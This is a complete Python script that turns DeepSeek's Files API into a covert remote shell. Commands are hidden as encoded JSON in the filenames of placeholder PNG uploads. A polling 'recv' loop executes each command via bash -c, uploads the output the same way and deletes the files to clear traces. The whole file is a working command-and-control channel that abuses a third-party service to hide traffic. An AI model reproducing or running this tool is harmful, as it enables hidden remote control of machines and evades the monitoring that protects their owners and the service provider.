#!/usr/bin/env python3
import argparse
import base64
import json
import os
import secrets
import subprocess
import sys
import time
import urllib.error
import urllib.request
import uuid

BASE = "https://api.deepseek.com"
HERE = os.path.dirname(os.path.abspath(__file__))
PNG = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAADElEQVR42mNgYGAAAAAEAAHI6uv5AAAAAElFTkSuQmCC"
)
RAW_CHUNK = 160
MAX_NAME = 500
KEY = None


def b64(b):
    return base64.b64encode(b).decode()


def unb64(s):
    return base64.b64decode(s)


def b64url(b):
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def unb64url(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def init_key():
    global KEY
    KEY = os.environ.get("DEEPSEEK_API_KEY", "").strip()
    if not KEY:
        path = os.path.join(HERE, "key.txt")
        if os.path.exists(path):
            with open(path, encoding="utf-8") as f:
                KEY = f.read().strip()
    if not KEY:
        raise SystemExit("missing API key: set DEEPSEEK_API_KEY or create key.txt next to this script")


def req(method, path, data=None, headers=None, timeout=60):
    h = {"Authorization": "Bearer " + KEY}
    if headers:
        h.update(headers)
    r = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            body = resp.read()
            return json.loads(body) if body else {}
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
        raise RuntimeError(f"{method} {path} -> HTTP {e.code}: {body}") from None
    except urllib.error.URLError as e:
        raise RuntimeError(f"{method} {path} -> {e.reason}") from None


def upload_png(filename):
    boundary = "----ds" + uuid.uuid4().hex
    body = b"".join(
        [
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"purpose\"\r\n\r\nuser_data\r\n".encode(),
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\nContent-Type: image/png\r\n\r\n".encode(),
            PNG,
            b"\r\n",
            f"--{boundary}--\r\n".encode(),
        ]
    )
    return req(
        "POST",
        "/files",
        data=body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )


def list_remote():
    return req("GET", "/files?limit=1000&order=asc").get("data", [])


def delete_remote(file_id):
    req("DELETE", "/files/" + file_id)


def make_name(prefix, obj):
    name = prefix + b64url(json.dumps(obj, separators=(",", ":"), ensure_ascii=False).encode()) + ".png"
    if len(name.encode()) > MAX_NAME:
        raise RuntimeError("encoded filename too long")
    return name


def parse_name(filename):
    if not filename.endswith(".png"):
        return None
    stem = filename[:-4]
    if stem.startswith("c-"):
        prefix, payload = "c", stem[2:]
    elif stem.startswith("r-"):
        prefix, payload = "r", stem[2:]
    else:
        return None
    try:
        obj = json.loads(unb64url(payload))
    except Exception:
        return None
    if not isinstance(obj, dict) or "i" not in obj or "s" not in obj or "d" not in obj:
        return None
    return prefix, obj


def chunks_of(data):
    return [data[i : i + RAW_CHUNK] for i in range(0, len(data), RAW_CHUNK)] or [b""]


def send_cmd(cmd, timeout=300.0, interval=0.5):
    cid = secrets.token_hex(4)
    pieces = chunks_of(cmd.encode("utf-8"))
    for seq, chunk in enumerate(pieces):
        upload_png(make_name("c-", {"i": cid, "s": seq, "n": len(pieces), "d": b64(chunk)}))

    deadline = time.time() + timeout if timeout and timeout > 0 else None
    got = {}
    total = None
    code = None
    while True:
        for f in list_remote():
            p = parse_name(f.get("filename", ""))
            if not p or p[0] != "r":
                continue
            o = p[1]
            if o["i"] != cid:
                continue
            got[o["s"]] = o
            total = o["n"]
            code = o.get("x")
        if total is not None and len(got) == total:
            break
        if deadline is not None and time.time() > deadline:
            raise RuntimeError(f"timed out waiting for result {cid} (is recv running?)")
        time.sleep(interval)

    out = b"".join(unb64(got[s]["d"]) for s in range(total))
    sys.stdout.buffer.write(out)
    sys.stdout.buffer.flush()
    if code:
        print(f"[exit {code}]", file=sys.stderr)

    for f in list_remote():
        p = parse_name(f.get("filename", ""))
        if p and p[0] == "r" and p[1].get("i") == cid:
            try:
                delete_remote(f["id"])
            except RuntimeError as e:
                print(f"cleanup failed: {e}", file=sys.stderr)


def console(timeout, interval):
    interactive = sys.stdin.isatty()
    while True:
        try:
            line = input("> " if interactive else "")
        except EOFError:
            break
        except KeyboardInterrupt:
            print(file=sys.stderr)
            break
        if not line.strip():
            continue
        if line.strip() in ("exit", "quit", ":q"):
            break
        try:
            send_cmd(line, timeout, interval)
        except KeyboardInterrupt:
            print("\ninterrupted", file=sys.stderr)
        except RuntimeError as e:
            print(f"error: {e}", file=sys.stderr)
    if interactive:
        print()


def serve(once, interval, idle_timeout):
    pending = {}
    start = time.time()
    print("[recv] listening", file=sys.stderr, flush=True)
    while True:
        commands = []
        for f in list_remote():
            p = parse_name(f.get("filename", ""))
            if p and p[0] == "c":
                commands.append((f, p[1]))

        for f, o in commands:
            pending.setdefault(o["i"], {})[o["s"]] = (o, f["id"])

        for cid, parts in list(pending.items()):
            total = next(iter(parts.values()))[0].get("n")
            if total is None or len(parts) < total:
                continue
            data = b"".join(unb64(parts[s][0]["d"]) for s in range(total))
            cmd = data.decode("utf-8", "replace")
            print(f"[recv] << {cmd}", file=sys.stderr, flush=True)
            p = subprocess.run(
                ["bash", "-c", cmd],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
            )
            out = p.stdout or b""
            code = p.returncode
            pieces = chunks_of(out)
            for seq, chunk in enumerate(pieces):
                upload_png(
                    make_name(
                        "r-",
                        {"i": cid, "s": seq, "n": len(pieces), "x": code, "d": b64(chunk)},
                    )
                )
            seen = set()
            for _o, fid in parts.values():
                if fid not in seen:
                    seen.add(fid)
                    try:
                        delete_remote(fid)
                    except RuntimeError as e:
                        print(f"[recv] delete failed: {e}", file=sys.stderr)
            del pending[cid]
            print(f"[recv] -> {len(out)} bytes, exit {code}", file=sys.stderr, flush=True)

        if once:
            break
        if idle_timeout and not commands and time.time() - start > idle_timeout:
            break
        time.sleep(interval)


def show_list():
    data = list_remote()
    if not data:
        print("no files")
        return
    groups = {"c": {}, "r": {}}
    for f in data:
        p = parse_name(f.get("filename", ""))
        if not p:
            print(f"{f['id']}  {f['filename']}  (unrecognized)")
            continue
        groups[p[0]].setdefault(p[1]["i"], {})[p[1]["s"]] = p[1]
    for kind, title in (("c", "commands"), ("r", "results")):
        for cid, parts in groups[kind].items():
            total = next(iter(parts.values())).get("n")
            done = total is not None and len(parts) == total
            if not done:
                print(f"{cid}  {title[:-1]}  (incomplete {len(parts)}/{total})")
                continue
            data_bytes = b"".join(unb64(parts[s]["d"]) for s in range(total))
            if kind == "c":
                print(f"{cid}  command  {data_bytes.decode('utf-8', 'replace')}")
            else:
                text = data_bytes.decode("utf-8", "replace")
                code = next(iter(parts.values())).get("x")
                print(f"{cid}  result   exit={code}  {text!r}")


def main():
    parser = argparse.ArgumentParser(prog="files_api.py")
    sub = parser.add_subparsers(dest="action", required=True)

    ps = sub.add_parser("send", help="interactive console, or send one command and print its output")
    ps.add_argument("command", nargs="*")
    ps.add_argument("--timeout", type=float, default=300.0, help="seconds to wait for a result (0 = forever)")
    ps.add_argument("--interval", type=float, default=0.5)

    pr = sub.add_parser("recv", help="run uploaded commands and send their output back")
    pr.add_argument("--once", action="store_true", help="process available commands and exit")
    pr.add_argument("--interval", type=float, default=1.0)
    pr.add_argument("--idle-timeout", type=float, default=0.0)

    sub.add_parser("list", help="show remote commands and results")

    args = parser.parse_args()
    init_key()
    try:
        if args.action == "send":
            if args.command:
                send_cmd(" ".join(args.command), args.timeout, args.interval)
            else:
                console(args.timeout, args.interval)
        elif args.action == "recv":
            serve(args.once, args.interval, args.idle_timeout)
        elif args.action == "list":
            show_list()
    except RuntimeError as e:
        print(f"error: {e}", file=sys.stderr)
        return 1
    except KeyboardInterrupt:
        print(file=sys.stderr)
        return 130
    return 0


if __name__ == "__main__":
    sys.exit(main())
